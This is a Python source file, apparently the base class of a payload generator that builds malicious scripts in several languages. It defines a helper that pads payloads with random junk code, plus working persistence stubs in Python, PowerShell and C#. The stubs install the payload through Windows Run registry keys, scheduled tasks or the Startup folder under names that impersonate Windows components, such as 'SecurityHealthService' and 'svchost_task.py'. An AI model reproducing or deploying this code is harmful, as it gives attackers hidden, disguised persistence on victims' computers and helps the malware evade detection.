# base generator class that all language generators inherit from
# keeps shared logic in one place to avoid duplication

import random
import string


class BaseGenerator:
    """base class for all payload generators"""

    LANG_ID = ""      # e.g. "py", "go"
    LANG_NAME = ""    # e.g. "Python 3", "Golang"
    FILE_EXT = ".txt" # file extension for saved payloads

    def generate(self, host: str, port: str, opts: dict, ptype: str, tpl: dict, adv: dict) -> str:
        """main entry point - override in subclasses"""
        raise NotImplementedError

    # shared helpers available to all generators

    @staticmethod
    def rstr(n: int) -> str:
        """generate a random alphanumeric string"""
        return "".join(random.choices(string.ascii_letters + string.digits, k=n))

    @staticmethod
    def py_junk() -> str:
        """generate a junk python function to pad the payload"""
        v1 = "".join(random.choices(string.ascii_lowercase, k=8))
        v2 = "".join(random.choices(string.ascii_lowercase, k=8))
        n = random.randint(10, 50)
        return f"def _{v1}():\n    {v2} = [x**2 for x in range({n})]\n    return sum({v2})\n_{v1}()\n"

    @staticmethod
    def persist_py(mode: str) -> str:
        """return a python persistence stub"""
        if mode == "registry":
            return (
                "import winreg, sys, os\n"
                "try:\n"
                "    k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n"
                "    winreg.SetValueEx(k, 'WindowsUpdateHost', 0, winreg.REG_SZ, sys.executable + ' ' + (os.path.realpath(__file__) if not getattr(sys, 'frozen', False) else sys.executable))\n"
                "    winreg.CloseKey(k)\n"
                "except: pass"
            )
        elif mode == "schtask":
            return "import os, sys; os.system('schtasks /create /tn \"SecurityHealthService\" /tr \"' + sys.executable + ' ' + (os.path.realpath(__file__) if not getattr(sys, 'frozen', False) else sys.executable) + '\" /sc daily /st 12:00 /f')"
        elif mode == "startup":
            return (
                "import os, shutil, sys\n"
                "try:\n"
                "    dst = os.path.join(os.environ['APPDATA'], r'Microsoft\\Windows\\Start Menu\\Programs\\Startup', 'svchost_task.py')\n"
                "    shutil.copy(os.path.realpath(__file__) if not getattr(sys, 'frozen', False) else sys.executable, dst)\n"
                "except: pass"
            )
        return ""

    @staticmethod
    def persist_ps1(mode: str) -> str:
        """return a powershell persistence stub"""
        if mode == "registry":
            return "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value $MyInvocation.MyCommand.Path -PropertyType String -Force"
        elif mode == "schtask":
            return "Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument \"-WindowStyle Hidden -File $($MyInvocation.MyCommand.Path)\") -Trigger (New-ScheduledTaskTrigger -Daily -At 12pm) -TaskName 'SecurityUpdate' -Force"
        return ""

    @staticmethod
    def persist_csharp(mode: str) -> str:
        """return a c# persistence stub"""
        if mode == "registry":
            return (
                "        static void Install() {\n"
                "            try {\n"
                "                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", true);\n"
                "                key.SetValue(\"WinUpdateAgent\", Process.GetCurrentProcess().MainModule.FileName);\n"
                "            } catch {}\n"
                "        }\n"
            )
        elif mode == "schtask":
            return "        static void Install() { try { Process.Start(new ProcessStartInfo { FileName = \"schtasks\", Arguments = \"/create /tn \\\"SecurityHealthService\\\" /tr \\\"\" + Process.GetCurrentProcess().MainModule.FileName + \"\\\" /sc daily /st 12:00 /f\", CreateNoWindow = true }); } catch {} }\n"
        return ""
